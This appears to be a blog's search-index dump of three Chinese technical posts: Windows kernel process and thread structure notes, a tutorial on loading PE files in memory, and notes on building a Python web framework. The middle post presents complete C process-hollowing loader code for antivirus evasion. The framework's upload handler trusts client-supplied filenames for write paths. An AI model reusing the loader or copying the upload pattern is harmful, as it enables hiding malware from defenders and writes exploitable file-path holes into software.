Unused; ULONG ActiveProcessors; //记录进程正在哪些处理器上运行 ULONG KernelTime; //在内核模式运行所花时间 ULONG UserTime; //在用户模式运行所花时间 LIST_ENTRY ReadyListHead; //保存进程中处于就绪状态但未被加入全局就绪链表的线程 SINGLE_LIST_ENTRY SwapListEntry; //进程要被换出时，通过此域加入到KiProcessOutSwapListHead为头的单链表 PVOID VdmTrapcHandler; //VDM环境下运行16位程序时，处理Ctrl+C中断的函数 LIST_ENTRY ThreadListHead; //指向一个链表头，链表中包含该进程的所有线程 ULONG ProcessLock; //一个自旋锁对象。保证对进程数据结构中成员的互斥访问 ULONG Affinity; //指定该进程的线程可以在哪些处理器上运行 union &#123; ULONG AutoAlignment: 1; ULONG DisableBoost: 1; // ULONG DisableQuantum: 1; ULONG ReservedFlags: 29; LONG ProcessFlags; &#125;; CHAR BasePriority; //该进程的线程的基本优先级 CHAR QuantumReset; //进程中线程的基本时限重置值 UCHAR State; //说明进程是否在内存中 UCHAR ThreadSeed; //该进程的下一个创建线程的理想处理器 UCHAR PowerState; //电源状态 UCHAR IdealNode; //进程优先选择的处理器节点 UCHAR Visited; union &#123; KEXECUTE_OPTIONS Flags; UCHAR ExecuteOptions; //NX执行选项 &#125;; ULONG StackCount; //当前进程中有多少个线程的栈位于内存中 LIST_ENTRY ProcessListEntry; //当前系统中所有具有活动线程的进程通过这个域串成一个链表 UINT64 CycleTime;&#125; KPROCESS, *PKPROCESS; 那么在线程当中 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181typedef struct _KTHREAD&#123; DISPATCHER_HEADER Header; UINT64 CycleTime; ULONG HighCycleTime; UINT64 QuantumTarget; PVOID InitialStack; PVOID StackLimit; PVOID KernelStack; ULONG ThreadLock; union &#123; KAPC_STATE ApcState; UCHAR ApcStateFill[23]; &#125;; CHAR Priority; WORD NextProcessor; WORD DeferredProcessor; ULONG ApcQueueLock; ULONG ContextSwitches; UCHAR State; UCHAR NpxState; UCHAR WaitIrql; CHAR WaitMode; LONG WaitStatus; union &#123; PKWAIT_BLOCK WaitBlockList; PKGATE GateObject; &#125;; union &#123; ULONG KernelStackResident: 1; ULONG ReadyTransition: 1; ULONG ProcessReadyQueue: 1; ULONG WaitNext: 1; ULONG SystemAffinityActive: 1; ULONG Alertable: 1; ULONG GdiFlushActive: 1; ULONG Reserved: 25; LONG MiscFlags; &#125;; UCHAR WaitReason; UCHAR SwapBusy; UCHAR Alerted[2]; union &#123; LIST_ENTRY WaitListEntry; SINGLE_LIST_ENTRY SwapListEntry; &#125;; PKQUEUE Queue; ULONG WaitTime; union &#123; struct &#123; SHORT KernelApcDisable; SHORT SpecialApcDisable; &#125;; ULONG CombinedApcDisable; &#125;; PVOID Teb; union &#123; KTIMER Timer; UCHAR TimerFill[40]; &#125;; union &#123; ULONG AutoAlignment: 1; ULONG DisableBoost: 1; ULONG EtwStackTraceApc1Inserted: 1; ULONG EtwStackTraceApc2Inserted: 1; ULONG CycleChargePending: 1; ULONG CalloutActive: 1; ULONG ApcQueueable: 1; ULONG EnableStackSwap: 1; ULONG GuiThread: 1; ULONG ReservedFlags: 23; LONG ThreadFlags; &#125;; union &#123; KWAIT_BLOCK WaitBlock[4]; struct &#123; UCHAR WaitBlockFill0[23]; UCHAR IdealProcessor; &#125;; struct &#123; UCHAR WaitBlockFill1[47]; CHAR PreviousMode; &#125;; struct &#123; UCHAR WaitBlockFill2[71]; UCHAR ResourceIndex; &#125;; UCHAR WaitBlockFill3[95]; &#125;; UCHAR LargeStack; LIST_ENTRY QueueListEntry; PKTRAP_FRAME TrapFrame; PVOID FirstArgument; union &#123; PVOID CallbackStack; ULONG CallbackDepth; &#125;; PVOID ServiceTable; UCHAR ApcStateIndex; CHAR BasePriority; CHAR PriorityDecrement; UCHAR Preempted; UCHAR AdjustReason; CHAR AdjustIncrement; UCHAR Spare01; CHAR Saturation; ULONG SystemCallNumber; ULONG Spare02; ULONG UserAffinity; PKPROCESS Process; ULONG Affinity; PKAPC_STATE ApcStatePointer[2]; union &#123; KAPC_STATE SavedApcState; UCHAR SavedApcStateFill[23]; &#125;; CHAR FreezeCount; CHAR SuspendCount; UCHAR UserIdealProcessor; UCHAR Spare03; UCHAR Iopl; PVOID Win32Thread; PVOID StackBase; union &#123; KAPC SuspendApc; struct &#123; UCHAR SuspendApcFill0[1]; CHAR Spare04; &#125;; struct &#123; UCHAR SuspendApcFill1[3]; UCHAR QuantumReset; &#125;; struct &#123; UCHAR SuspendApcFill2[4]; ULONG KernelTime; &#125;; struct &#123; UCHAR SuspendApcFill3[36]; PKPRCB WaitPrcb; &#125;; struct &#123; UCHAR SuspendApcFill4[40]; PVOID LegoData; &#125;; UCHAR SuspendApcFill5[47]; &#125;; UCHAR PowerState; ULONG UserTime; union &#123; KSEMAPHORE SuspendSemaphore; UCHAR SuspendSemaphorefill[20]; &#125;; ULONG SListFaultCount; LIST_ENTRY ThreadListEntry; LIST_ENTRY MutantListHead; PVOID SListFaultAddress; PVOID MdlForLockedTeb;&#125; KTHREAD, *PKTHREAD; Header：说明该对象是一个分发器对象，可以被等待。线程结束时，等待被满足。 MutantListHead：指向一个链表头。链表中包含所有属于该线程的突变体对象（mutant，对应互斥体对象）。 InitialStack：原始栈位置（高地址） StackLimit：栈低地址 KernelStack：内核调用栈开始位置 StackBase：当前栈的基地址。 ThreadLock：自旋锁，用于保护线程数据成员。 ApcState：KAPC_STATE结构，指定线程的APC信息，包括APC链表，是否有APC正在等待，是否正在处理APC。 ApcQueueable：是否可插入APC NextProcessor：关于处理器调度的选择。 DeferredProcessor：关于处理器调度的选择。 AdjustReason：优先级调整原因 AdjustIncrement：优先级调整调整量 ApcQueueLock：保护APC队列的自旋锁。 ContextSwitches：记录线程进行了多少次切换。 State：线程当前状态。 NpxState：浮点处理器状态。 Alertable：线程是否可以被唤醒。 WaitNext： WaitIrql：原先的IRQL。 WaitReason：等待原因 WaitMode：线程等待时的处理器模式，内核or用户 WaitStatus：等待的结果状态。 WaitBlockList：KWAIT_BLOCK为元素的链表，记录线程所有等待的分发器对象。每个分发器对象也有一个KWAIT_BLOCK组成的链表，记录所有等待在该对象的线程。 GateObject：等待的门对象，等待门对象和等待分发器对象不会同时发生。 Priority：动态优先级。 BasePriority：基本优先级。 PriorityDecrement：优先级动态调整过程中的递减值。 Saturation：线程基本优先级调整相对于进程基本优先级是否超过了区间的一半。 EnableStackSwap：内核栈是否准许被换出。 SwapBusy：当前是否正在进程上下文切换。 Alerted：线程在警告模式下是否可以被唤醒。 WaitListEntry：双向链表节点，等待被执行时，作为节点加入某链表 SwapListEntry：单链表节点，内核栈需要被换出时，加入KiStackInSwapListHead为头的链表。另外，线程处于DeferredReady状态时加入DeferredReadyListHead为头的链表。 Queue：队列分发器对象，线程正在处理此队列中的项。 WaitTime：线程进入等待时刻的时间点。 KernelApcDisable/SpecialApcDisable：内核APC和特殊内核APC是否被禁止。 TEB：进程地址空间的一个TEB域 Timer：定时器。 AutoAlignment：与KPROCESS相同 DisableBoost：与KPROCESS相同 WaitBlock：4个KWAIT_BLOCK成员的数组，线程等待的分发器少于4个时，使用这里的空间，不分配新空间。 QueueListEntry：线程处理一个队列项时，加入到队列对象的线程链表中的地址。 TrapFrame：指向KTRAP_FRAME类型的指针。用户保存执行现场。 CallbackStack：线程的回调栈地址，在从内核模式返回用户模式时用。 ServiceTable： 指向系统使用的系统服务表，非GUI线程为KeServiceDescriptorTable，GUI线程为KeServiceDescriptorTableShadow。 IdealProcess：理想处理器 Preempted：是否被高优先级线程抢占了。 ProcessReadyQueue：是否在进程对象的ReadyListHead列表中。 KernelStackResident：线程的内核栈是否驻留在线程中。 Affinity：处理器亲和性，为线程指定的处理器集合必须是该集合的子集。 UserAffinity：线程的用户亲和性。 Process：执行线程的进程对象。 ApcStateIndex：指明当前APC状态在ApcStatePointer域中的索引。 Win32Thread：指向Windows子系统管理的区域的指针。 SuspendApc/SuspendSemaphore：用于支持线程挂起的域。 ThreadListEntry：双链表的节点，线程被创建时，加入到进程的ThreadListHead链表中。 SListFaultAddress：上一次用户模式互锁单链表POP操作发生页面错误的地址。 SuspendSemaphore：与上面有关。","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"},{"name":"kernel","slug":"notes/kernel","permalink":"https://joe1sn.eu.org/categories/notes/kernel/"}],"tags":[{"name":"kernel","slug":"kernel","permalink":"https://joe1sn.eu.org/tags/kernel/"},{"name":"windows","slug":"windows","permalink":"https://joe1sn.eu.org/tags/windows/"}]},{"title":"【免杀】内存加载PE文件","slug":"pe-loader","date":"2023-06-13T00:46:20.000Z","updated":"2025-01-26T14:46:00.784Z","comments":true,"path":"2023/06/13/pe-loader/","link":"","permalink":"https://joe1sn.eu.org/2023/06/13/pe-loader/","excerpt":"使用windows API编写PE文件加载器（Loader） 目前支支持32位","text":"使用windows API编写PE文件加载器（Loader） 目前支支持32位 PE文件结构 在《逆向工程核心原理》中讲的已经很详细了，这里主要面向32位的可执行程序来讲解。 DOS头和PE头统称为PE头，下面的部分称之为PE体。 DOS头 DOS头的文件结构 123456789101112131415161718192021typedef struct _IMAGE_DOS_HEADER &#123; // DOS .EXE header WORD e_magic; // Magic number WORD e_cblp; // 文件最后一页的字节数 WORD e_cp; // 文件中的页数 WORD e_crlc; // 重定位 WORD e_cparhdr; // 段中头大小 WORD e_minalloc; // 需要最少的额外段落 WORD e_maxalloc; // 需要最多的额外段落 WORD e_ss; // 初始（相对）SS 值 WORD e_sp; // 初始SP值 WORD e_csum; // Checksum WORD e_ip; // 初始 IP 值 WORD e_cs; // 初始（相对）CS 值 WORD e_lfarlc; // 重定位表的文件地址 WORD e_ovno; // 叠加数 WORD e_res[4]; // 保留字 WORD e_oemid; // OEM 标识符（用于 e_oeminfo） WORD e_oeminfo; // OEM信息； e_oemid 具体 WORD e_res2[10]; // 保留字 LONG e_lfanew; // 新exe头文件地址 &#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER; 其中DOS头有一个很重要的部分e_lfanew，他指向了exe的文件头，在我们编写的loader获取头的部分 12DOSHeader = PIMAGE_DOS_HEADER(Image); //得到DOS头NTHeader = PIMAGE_NT_HEADERS(DWORD(Image) + DOSHeader-&gt;e_lfanew); //得到PE头 NT头 那么关于NT文件头 12345678910typedef struct _IMAGE_NT_HEADERS &#123; DWORD Signature; //文件类型 // IMAGE_DOS_SIGNATURE 0x5A4D // MZ // IMAGE_OS2_SIGNATURE 0x454E // NE // IMAGE_OS2_SIGNATURE_LE 0x454C // LE // IMAGE_VXD_SIGNATURE 0x454C // LE // IMAGE_NT_SIGNATURE 0x00004550 // PE00 IMAGE_FILE_HEADER FileHeader; IMAGE_OPTIONAL_HEADER32 OptionalHeader;&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32; 这个文件头很关键，Signature可以判断类型，FileHeader即文件头，可以从NumberOfSections获得节区数目。 OPTIONAL_HEADER结构体如下 123456789101112131415161718192021222324252627282930313233343536373839404142typedef struct _IMAGE_OPTIONAL_HEADER &#123; // // Standard fields. // WORD Magic; BYTE MajorLinkerVersion; BYTE MinorLinkerVersion; DWORD SizeOfCode; DWORD SizeOfInitializedData; DWORD SizeOfUninitializedData; DWORD AddressOfEntryPoint; DWORD BaseOfCode; DWORD BaseOfData; // // NT additional fields. // DWORD ImageBase; DWORD SectionAlignment; DWORD FileAlignment; WORD MajorOperatingSystemVersion; WORD MinorOperatingSystemVersion; WORD MajorImageVersion; WORD MinorImageVersion; WORD MajorSubsystemVersion; WORD MinorSubsystemVersion; DWORD Win32VersionValue; DWORD SizeOfImage; DWORD SizeOfHeaders; DWORD CheckSum; WORD Subsystem; WORD DllCharacteristics; DWORD SizeOfStackReserve; DWORD SizeOfStackCommit; DWORD SizeOfHeapReserve; DWORD SizeOfHeapCommit; DWORD LoaderFlags; DWORD NumberOfRvaAndSizes; IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32; OPTIONAL_HEADER中记载了很多详细信息，其中有用的就是ImageBase、SizeOfHeaders和AddressOfEntryPoint ImageBase：描写在虚拟内存中（不了解操作系统的话可以理解为程序启动的基地址）的地址 SizeOfHeaders：记录了整个PE头的大小（包含DOS头），方便控制写入程序的大小 AddressOfEntryPoint：记录程序入口代码起始地址，比如ImageBase可能为0x4000，AddressOfEntryPoint可能为0x4100。 IAT导入表 Windows为了知道使用了那些函数，会导入这些函数的表，从导入表到动态链接中查找函数。每一个节都会有一个导入表，每一个表的信息有40字节，那么找到表的地址就是base + count*40，其中base为DOSHeader-&gt;e_lfanew+248，这里是导入表的初始地址的指针。 进程结构 Pre- PEB 这部分是铺垫的内容，主要描述的就是几个基础寄存器。 这些寄存器是CPU中设计好的， CS (Code Segment Register)：代码段的段基址 DS(Data Segment Register)：数据段的段基址 ES(Extra Segment Register)：其值为附加数据段的段基值，称为“附加”是因为此段寄存器用途不像其他 sreg 那样固定，可以额外做他用。 FS(Extra Segment Register)：其值为附加数据段的段基值 GS：同上 SS(Stack Segment Register)：堆栈段寄存器 在实模式中，CS、DS、ES、SS中的值是物理地址 在保护模式中，装入寄存器的是段选择子FS 其中最重要的就是 FS寄存器。在保护模式下，x86处理器使用段描述符来管理内存，将内存划分为不同的段，如代码段、数据段、堆栈段等。段选择子是一个16位的值，用于标识特定段的起始地址和访问权限。 FS寄存器主要有两个作用： 定位线程局部存储（Thread Local Storage，TLS）： 在多线程程序中，每个线程通常都有自己的TLS，用于存储线程本地的数据，如线程特定变量。 FS寄存器中存储了一个特殊的段选择子，用于定位线程的TLS。 线程可以通过访问FS寄存器来访问自己的TLS。 访问段描述符表（Global Descriptor Table，GDT）： GDT是一个表格，用于存储段描述符的信息，包括段的起始地址、大小、访问权限等。 FS寄存器中存储了GDT中的一个段选择子，该段选择子指向了一个描述线程局部存储段的段描述符。 当线程需要访问TLS时，通过访问FS寄存器中的段选择子，可以获得TLS的起始地址和访问权限。 PEB PEB全称是 Process Environment Block，进程环境块 为了获取PEB的消息可以直接从FS段选择子找到TEB（线程环境块），再从TEB找到PEB，这里可以CTX-&gt;Ebx + 8找到PEB 编程相关 创建一个进程我们可以使用CreateProcess函数 新进程在调用进程的安全上下文中运行。 如果调用进程正在模拟其他用户，则新进程将令牌用于调用进程，而不是模拟令牌。 若要在模拟令牌表示的用户的安全上下文中运行新进程，请使用 CreateProcessAsUser 或 CreateProcessWithLogonW 函数。 123456789101112BOOL CreateProcessA( [in, optional] LPCSTR lpApplicationName, [in, out, optional] LPSTR lpCommandLine, [in, optional] LPSECURITY_ATTRIBUTES lpProcessAttributes, [in, optional] LPSECURITY_ATTRIBUTES lpThreadAttributes, [in] BOOL bInheritHandles, [in] DWORD dwCreationFlags, [in, optional] LPVOID lpEnvironment, [in, optional] LPCSTR lpCurrentDirectory, [in] LPSTARTUPINFOA lpStartupInfo, [out] LPPROCESS_INFORMATION lpProcessInformation); lpApplicationName：exe的文件路径，比如c:\\test.exe lpCommandLine：要执行该程序时的参数 bInheritHandles：如果此参数为 TRUE，则调用进程中的每个可继承句柄都由新进程继承。 如果参数为 FALSE，则不继承句柄。 dwCreationFlags：控制优先级类和进程的创建的标志。 lpProcessInformation：进程信息 windows中使用PROCESS_INFORMATION描述 123456typedef struct _PROCESS_INFORMATION &#123; HANDLE hProcess; //新创建的进程的句柄。 句柄用于在对进程对象执行操作的所有函数中指定进程。 HANDLE hThread; //新创建的进程的主线程的句柄。 句柄用于在线程对象上执行操作的所有函数中指定线程。 DWORD dwProcessId; //可用于标识进程的值。 从创建进程到进程的所有句柄关闭并释放进程对象为止，该值有效;此时，可以重复使用标识符。 DWORD dwThreadId; //可用于标识线程的值。 在线程创建到线程的所有句柄关闭且线程对象释放之前，该值有效;此时，可以重复使用标识符。&#125; PROCESS_INFORMATION, *PPROCESS_INFORMATION, *LPPROCESS_INFORMATION; lpStartupInfo：启动时的信息 同时如果要开启一个进程的话需要向其提供基础环境，windows中为STARTUPINFOA，指定创建时进程的主窗口的窗口工作站、桌面、标准句柄和外观。 12345678910111213typedef struct _STARTUPINFOA &#123; DWORD cb; //结构大小（以字节为单位）。 LPSTR lpReserved; //保留;必须为 NULL ... DWORD dwFlags; //一个位字段，用于确定进程创建窗口时是否使用某些 STARTUPINFO 成员。 此成员可以是以下一个或多个值。 //参考 https://learn.microsoft.com/zh-cn/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa ... WORD cbReserved2; //保留供 C 运行时使用;必须为零。 LPBYTE lpReserved2; //保留供 C 运行时使用;必须为 NULL。 HANDLE hStdInput; HANDLE hStdOutput; HANDLE hStdError;&#125; STARTUPINFOA, *LPSTARTUPINFOA; 最后创建好的进程就在lpProcessInformation的hProcess中了 编写Loader（进程镂空） 知道了加载过程，那么 获得DOS头，从而获得NT头 检查是否为正确的文件格式（PE） 初始化进程信息和启动时信息 创建当前程序进程的副本，并将副本设置为暂停 根据上下文信息找到导入表和PEB 复制导入表和PEB，将EAX设置为待加载PE文件的入口地址DWORD(pImageBase) + NTHeader-&gt;OptionalHeader.AddressOfEntryPoint; 恢复暂停的副本，运行加载的PE文件 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071#include &lt;windows.h&gt;#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;TlHelp32.h&gt;int RunPe(HANDLE Image)&#123; IMAGE_DOS_HEADER* DOSHeader; //DOS文件头 IMAGE_NT_HEADERS* NTHeader; //PE文件头 IMAGE_SECTION_HEADER* SectionHeader; //节头 PROCESS_INFORMATION PI; //进程信息 STARTUPINFOA SI; //启动信息 DWORD* ImageBase; //VAR基地址 void* pImageBase; //指向头的指针 int count; char FilePath[1024]; DOSHeader = PIMAGE_DOS_HEADER(Image); //得到DOS头 NTHeader = PIMAGE_NT_HEADERS(DWORD(Image) + DOSHeader-&gt;e_lfanew); //得到PE头 GetModuleFileNameA(0, FilePath, 1024); if (NTHeader-&gt;Signature == IMAGE_NT_SIGNATURE) &#123; //检查是否为PE文件 ZeroMemory(&amp;PI, sizeof(PI)); ZeroMemory(&amp;SI, sizeof(SI)); if (CreateProcessA(FilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &amp;SI, &amp;PI)) &#123; //创建当前进程的暂停副本 CONTEXT *CTX = PCONTEXT(VirtualAlloc(NULL,sizeof(CTX), MEM_COMMIT, PAGE_READWRITE)); CTX-&gt;ContextFlags = CONTEXT_FULL; //创建上下文 if (GetThreadContext(PI.hThread, LPCONTEXT(CTX))) &#123; //如果上下文在线程中 //读取指令 ReadProcessMemory(PI.hProcess, LPCVOID(CTX-&gt;Ebx + 8), LPVOID(&amp;ImageBase), 4, 0); pImageBase = VirtualAllocEx(PI.hProcess, LPVOID(NTHeader-&gt;OptionalHeader.ImageBase), NTHeader-&gt;OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE); // 向进程的暂停副本写入指令 WriteProcessMemory(PI.hProcess, pImageBase, Image, NTHeader-&gt;OptionalHeader.SizeOfHeaders, NULL); for (count = 0; count &lt; NTHeader-&gt;FileHeader.NumberOfSections; count++) &#123; SectionHeader = PIMAGE_SECTION_HEADER(DWORD(Image) + DOSHeader-&gt;e_lfanew+248+(count*40)); WriteProcessMemory(PI.hProcess, LPVOID(DWORD(pImageBase) + SectionHeader-&gt;VirtualAddress), LPVOID(DWORD(Image) + SectionHeader-&gt;PointerToRawData), SectionHeader-&gt;SizeOfRawData, 0); &#125; WriteProcessMemory(PI.hProcess, LPVOID(CTX-&gt;Ebx + 8), LPVOID(&amp;NTHeader-&gt;OptionalHeader.ImageBase), 4, 0); //将入口地址放入EAX寄存器 CTX-&gt;Eax = DWORD(pImageBase) + NTHeader-&gt;OptionalHeader.AddressOfEntryPoint; SetThreadContext(PI.hThread, LPCONTEXT(CTX)); ResumeThread(PI.hThread); return 1; &#125; &#125; &#125;&#125;unsigned char rawData[91209] = &#123;...&#125;;int main()&#123; RunPe(rawData); //getchar(); return 0;&#125;","categories":[{"name":"program","slug":"program","permalink":"https://joe1sn.eu.org/categories/program/"}],"tags":[{"name":"malware","slug":"malware","permalink":"https://joe1sn.eu.org/tags/malware/"},{"name":"C","slug":"C","permalink":"https://joe1sn.eu.org/tags/C/"}]},{"title":"【Muud开发】2.HTTP服务改善","slug":"web-0x2","date":"2023-06-01T12:15:29.000Z","updated":"2025-01-26T14:46:00.752Z","comments":true,"path":"2023/06/01/web-0x2/","link":"","permalink":"https://joe1sn.eu.org/2023/06/01/web-0x2/","excerpt":"从0到1开发一个勉强能用的python web“框架” 项目地址：https://github.com/Joe1sn/muud","text":"从0到1开发一个勉强能用的python web“框架” 项目地址：https://github.com/Joe1sn/muud 主要改进 6-1 返回报文设置 首先将原来的拼接字符串改为了Response类，实现HTTP报文字段的自定义 这样可以大大简化view.py中的代码 123456789101112131415161718192021class Response(): def __init__(self, type=&quot;json&quot;, status_code=200, reply=&quot;&quot;) -&gt; None: self.content_type = content_types[type] self.status_code = status_code if type == &quot;json&quot;: self.reply = json.dumps(reply, ensure_ascii=False).encode(&#x27;unicode_escape&#x27;).decode() else: self.reply = reply self.length = len(self.reply) def consum(self) -&gt; str: result = &quot;&quot; result += &quot;HTTP/1.1 &#123;status_code&#125; &#123;msg&#125;\\r\\n&quot;.format( status_code=self.status_code, msg=status_code_dict[self.status_code]) result += &quot;Content-Type: &#123;type&#125;\\r\\n&quot;.format( type = self.content_type) result += &quot;Content-Length: &#123;length&#125;\\r\\n&quot;.format( length=self.length) result += &quot;\\r\\n&quot; result += self.reply return result 这样就可以更简单的编写视图函数 12345@http_apidef html_test(http_request): data = &quot;&lt;html&gt;&lt;body&gt;&lt;h1&gt;Hello, world!&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;&quot; result = Response(reply=data,type=&quot;html&quot;) return result.consum().encode() 不过任然欠缺文件服务，不过在epoll服务器的send部分修改就行了，更复杂的还涉及到文件上传等，后续实现http.server这种服务效果，不然静态网页加载很麻烦。 6-2 设置更多的content_type 123456789101112131415161718192021content_types = &#123; &quot;text&quot;: &quot;text/plain&quot;, &quot;html&quot;: &quot;text/html&quot;, #HTML文档 &quot;css&quot; : &quot;text/css&quot;, #CSS样式表 &quot;js&quot; : &quot;text/javascript&quot;, #JavaScript脚本 &quot;json&quot;: &quot;application/json&quot;, &quot;pdf&quot;: &quot;application/pdf&quot;, &quot;xml&quot;: &quot;application/xml&quot;, &quot;bin&quot;: &quot;application/octet-stream&quot;, #[特质] &quot;jpeg&quot;: &quot;image/jpeg&quot;, #JPEG图像 &quot;png&quot;: &quot;image/png&quot;, #PNG图像 &quot;gif&quot;: &quot;image/gif&quot;, #GIF图像 &quot;mpeg&quot;: &quot;audio/mpeg&quot;, #MPEG音频 &quot;wav&quot;: &quot;audio/wav&quot;, #WAV音频 &quot;mp4&quot; : &quot;video/mp4&quot;, #MP4视频 &quot;mpeg&quot; : &quot;video/mpeg&quot;, #MPEG视频&#125; Response的返回改为bytes类型 123456789101112131415def consum(self) -&gt; bytes: result = &quot;&quot; result += &quot;HTTP/1.1 &#123;status_code&#125; &#123;msg&#125;\\r\\n&quot;.format( status_code=self.status_code, msg=status_code_dict[self.status_code]) result += &quot;Content-Type: &#123;type&#125;\\r\\n&quot;.format( type = self.content_type) result += &quot;Content-Length: &#123;length&#125;\\r\\n&quot;.format( length=self.length) result += &quot;\\r\\n&quot; result = result.encode() if type(self.reply) == bytes: result += self.reply else: result += self.reply.encode() return result 这样就能直接访问各种文件了，方便下一步渲染 1234567@http_apidef file_test(http_request): result=&quot;&quot; with open(r&quot;/mnt/d/Github/muud/test/test.pdf&quot;,&quot;rb&quot;) as f: result = f.read() result = Response(reply=result,type=&quot;pdf&quot;) return result.consum() 6-3~4 文件上传 这部分写的挺久的，因为涉及到epoll模型的改善，后面回继续改进这个模块 首先有这两个视图函数 1234567891011121314151617181920@http_apidef file_upload(http_request): result=&quot;&quot; with open(r&quot;/mnt/d/Github/muud/test/file_upload.html&quot;,&quot;rb&quot;) as f: result = f.read() result = Response(reply=result,type=&quot;html&quot;) return result.consum()@http_apidef upload(http_request): result=&quot;&quot; info(&quot;FILE Content&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&quot;) # info(http_request.data[&quot;len&quot;]/1024,&quot;KB&quot;) name = http_request.data[&quot;filename&quot;] # print(http_request.data[&quot;file&quot;][:0x20]) with open(r&quot;/mnt/d/Github/muud/test/&quot;+name,&quot;wb&quot;) as f: result = f.write(http_request.data[&quot;file&quot;]) data = &quot;&lt;html&gt;&lt;body&gt;&lt;h1&gt;okok&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;&quot; result = Response(reply=data,type=&quot;html&quot;,status_code=200) return result.consum() 目前参考了Django的上传，把数据结果收集在request中然后处理 那么就涉及HttpRequest的处理 首先新增了两个字段 12self.length = 0 #总长度self.cur_len = 0 #当前长度 从这个判断文件上传是否完成，然后就是消息的提取 1234567891011121314151617181920212223#文件上传，返回bytes类型数据elif &quot;multipart&quot; in content_type: pre_len = len(self.raw_data.split(b&quot;\\r\\n\\r\\n&quot;)[0])+4 raw_data = self.raw_data[pre_len:] self.cur_len = len(raw_data) self.data=&#123;&quot;name&quot;:&quot;&quot;, &quot;filename&quot;:&quot;&quot;, &quot;file&quot;:b&quot;&quot;, &quot;len&quot;:0&#125; boundary = b&quot;--&quot; + r_boundary.search(self.raw_data).group(1) file_info = raw_data.split(boundary)[1].split(b&quot;\\r\\n&quot;)[1] for attribute in file_info.split(b&quot;; &quot;): # 获得名字 if b&quot;name&quot; in attribute and b&quot;=&quot; in attribute and not attribute.lower().startswith(b&quot;content&quot;): if attribute.split(b&quot;=&quot;)[0] == b&quot;name&quot;: self.data[&quot;name&quot;] = b&quot;&quot;.join(attribute.split(b&quot;=&quot;)[1:])[1:-1].decode() elif attribute.split(b&quot;=&quot;)[0] == b&quot;filename&quot;: # 获得原始文件名 self.data[&quot;filename&quot;] = b&quot;&quot;.join(attribute.split(b&quot;=&quot;)[1:])[1:-1].decode() file_type = raw_data.split(boundary)[1].split(b&quot;\\r\\n&quot;)[2] pre_len = len(file_info) + len(file_type) + 2*4 #前置长度 self.data[&quot;file&quot;] = self.raw_data.split(boundary)[1][pre_len:-2] self.data[&quot;len&quot;] = len(self.data[&quot;file&quot;]) 由于使用了epoll模型，当上传的数据长度小于总长度时继续上传，完成后再进行处理，那么server就会有如下修改 数据可读时继续读取客户端发送过来的数据 12345678elif event &amp; select.EPOLLIN: # 有数据可读 try: data = b&quot;&quot; data = connections[fileno].recv(1024*1024*10) # print(&quot;data from server\\n&quot;,data) if data: requests[fileno] += data 由于我的epoll对每个发送过来的package都有一个response，所以需要修改 123456789101112131415161718192021# 处理请求并生成响应for fileno, data in requests.items(): if b&quot;HTTP&quot; in data or b&quot;http&quot; in data: # 解析请求头部 http = HTTPRequest(data=data, fileno=fileno, connections=connections) if http.cur_len &lt; http.length: pass else: http.show() http_route = HTTPRouter(http) response = http_route.route() responses[fileno] = response connections[fileno].send(response) # 构造响应头部和内容 # 清空请求缓冲区 response = b&#x27;&#x27; data = b&#x27;&#x27; requests[fileno] = b&#x27;&#x27; 然后测试了下效率，面对小文件的时候效率还说得过去（&lt;10MB），大文件的话又是使用的是对应fd的data进行拼接，增大了内存开销和CPU开销（不知道使用c的指针会不会快一些），这也是后续需要优化的东西 更大的文件后面会出现指数级下降，不过这里也可以看出来基于TCP的拥塞控制，单次发包最大为128kb，分块传输，后续可以针对这些特性进行改进。 6-6 重定向 12345@http_apidef redirect(http_request): data= &quot;http://www.qq.com&quot; result = Response(reply=data,type=&quot;text&quot;,status_code=302) return result.consum() 主要就是通过302跳转进行重定向，然后在返回报文哪里设置了几个新的参数 12345678910111213141516171819202122def consum(self) -&gt; bytes: result = &quot;&quot; if self.status_code == 302: result += &quot;HTTP/1.1 &#123;status_code&#125; &#123;msg&#125;\\r\\nLocation: &#123;location&#125;\\r\\n\\r\\n&quot;.format( status_code=self.status_code, msg=status_code_dict[self.status_code], location=self.reply) else: result += &quot;HTTP/1.1 &#123;status_code&#125; &#123;msg&#125;\\r\\n&quot;.format( status_code=self.status_code, msg=status_code_dict[self.status_code]) result += &quot;Content-Type: &#123;type&#125;\\r\\n&quot;.format( type = self.content_type) result += &quot;Content-Length: &#123;length&#125;\\r\\n&quot;.format( length=self.length) result += &quot;\\r\\n&quot; result = result.encode() if self.status_code == 302: pass else: if type(self.reply) == bytes: result += self.reply else: result += self.reply.encode() return result 之后可以在utils里面打包这些方法，我这里放在http_response下面 12345# 重定向def redirect(http_url): data= str(http_url) result = Response(reply=data,type=&quot;text&quot;,status_code=302) return result.consum()","categories":[{"name":"program","slug":"program","permalink":"https://joe1sn.eu.org/categories/program/"}],"tags":[{"name":"muud","slug":"muud","permalink":"https://joe1sn.eu.org/tags/muud/"},{"name":"web framework","slug":"web-framework","permalink":"https://joe1sn.eu.org/tags/web-framework/"}]},{"title":"【Muud开发】1.基础结构解析","slug":"web-0x1","date":"2023-05-31T17:43:18.000Z","updated":"2025-01-26T14:46:00.754Z","comments":true,"path":"2023/06/01/web-0x1/","link":"","permalink":"https://joe1sn.eu.org/2023/06/01/web-0x1/","excerpt":"从0到1开发一个勉强能用的python web“框架” 项目地址：https://github.com/Joe1sn/muud","text":"从0到1开发一个勉强能用的python web“框架” 